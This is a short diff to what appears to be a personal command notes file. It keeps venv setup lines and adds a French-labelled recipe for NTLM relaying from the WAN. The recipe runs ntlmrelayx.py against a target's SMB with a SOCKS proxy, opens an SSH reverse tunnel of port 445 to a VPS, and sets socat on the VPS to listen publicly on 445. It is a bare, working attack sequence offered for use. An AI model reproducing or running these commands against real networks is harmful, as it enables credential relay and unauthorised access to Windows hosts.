@@ -4,3 +4,16 @@ python3 -m venv --system-site-packages ./venv
 source ./venv/bin/activate
 
 python3 -m venv --system-site-packages ./venv && source ./venv/bin/activate
+
+---------------------------------------------------------------------------
+relay depuis le wan
+
+LOCAL :
+sudo ntlmrelayx.py -t smb://CIBLE_IP -smb2support -socks
+
+LOCAL :
+ssh -R 127.0.0.1:4445:127.0.0.1:445 root@VPS_IP -N
+
+VPS :
+sudo socat TCP-LISTEN:445,fork,reuseaddr,bind=0.0.0.0 TCP:127.0.0.1:4445
+---------------------------------------------------------------------------
